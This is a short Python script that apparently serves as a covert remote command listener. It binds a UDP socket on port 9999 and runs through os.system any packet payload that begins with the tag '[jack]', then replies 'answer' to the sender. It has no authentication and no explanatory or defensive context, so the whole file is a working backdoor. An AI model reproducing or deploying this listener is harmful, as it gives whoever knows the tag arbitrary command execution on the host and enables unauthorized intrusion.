import socket, os

host = "XXX.XXX.XX.XX"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((host, port))

quit = False
#print("[started]=[" + host + "]")

while not quit:
    try:
        data, addr = s.recvfrom(1024)

        #print("[" + addr[0] + "]/", end = "")
        #print(data.decode("utf-8"))

        check = data.decode("utf-8")
        check = check[:6]
        strCmd = data.decode("utf-8")
        strCmd = strCmd[10:len(strCmd):1]

        if (check == "[jack]"):
            os.system(strCmd)
            str1 = "answer"
            s.sendto(str1.encode("utf-8"), addr)

    except:
        #print("\n[stopped]")
        quit = True

s.close()
